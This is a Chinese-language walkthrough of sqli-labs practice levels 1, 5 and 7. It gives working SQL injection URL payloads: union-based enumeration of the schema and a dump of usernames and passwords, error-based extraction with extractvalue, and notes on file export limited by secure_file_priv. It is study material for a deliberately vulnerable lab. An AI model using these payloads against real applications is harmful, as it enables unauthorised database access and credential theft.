sqli-labs通关(1-10)

Less-1

payload: http://url/?id=1'

通过加上单引号，有报错信息，通过报错信息可以看出是字符型注入

接下来查列数

payload: http://url/?id=1' order by 3 --+

查3成功，查4报错，说明这张表有3列

然后查回显的位置，这里吧id=1改成-1，因为没有id=-1这个项，就会回显union select 的内容

payload: http://url/?id=-1' union select 1,2,3 --+

可以看到第二位，第三位是回显位

查数据库名

payload: http://url/?id=-1' union select 1,database(),3 --+ 查当前数据库名

payload: http://url/?id=-1' union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+ 查所有数据库名, group_concat()把所有数据用一行输出，也可以用limit 控制，一行一行查询

查表名

payload: http://url/?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 --+

查列名

payload: http://url/?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),3 --+

查数据

payload: http://url/?id=-1' union select 1,(select group_concat(username) from users),(select group_concat(password) from users) --+

用limit控制，一行一行查询

payload: http://url/?id=-1' union select 1,(select username from users limit 0，1),(select group_concat(password) from users) --+

Less-5

输入单引号，根据报错，输入参数是被单引号包裹的

但是发现并没有回显任何数据

这样我们可以想到时间盲注，布尔盲注和报错注入，这里我使用的是报错注入

查数据库名

payload: http://url/?id=1' and 1=extractvalue(1,concat(0x7e,database())) --+

查表名

payload: http://url/?id=1' and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security')))--+

查列名，查数据，以此类推

Less-7

这个题和文件操作有关

注意在要对文件进行导入导出首先得要有足够的权限，

但是mysql默认不能导入和导出文件，这与secure_file_priv的值有关（默认为null)

secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。
1、当secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出

2、当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下

3、当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制

我在网上找到的有关less-7的文章，大多都是修改了secure_file_priv的值，或者自己查看到了secure_file_priv规定的路径。

（mysql 5.6.34版本以后 secure_file_priv的值默认为NULL。并且无法用sql语句对其进行修改）此句来自网络，我的mysql 5.7.29，secure_file_priv的值为一个具体的路径

我的MariaDB 10.3.22，发现secure_file_priv没有具体值，写入文件的默认路径是/var/lib/mysql/数据库名

虽然报错了，但是确实是成功导出文件了
